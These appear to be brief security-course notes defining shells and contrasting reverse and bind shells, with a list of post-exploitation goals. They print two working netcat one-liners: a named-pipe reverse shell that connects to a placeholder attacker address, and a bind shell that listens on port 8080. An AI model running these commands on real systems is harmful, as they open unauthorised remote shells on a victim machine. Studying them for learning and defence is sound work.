## What? 
A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

- **Remote System Control**
- **Privilege Escalation**
- **Data Exfiltration**
- **Persistence and Maintenance Access**
- **Post-Exploitation Activities**
- **Access Other Systems on the Network

## Reverse Shell
"connect back shell"

As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`


## Bind Shell
bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
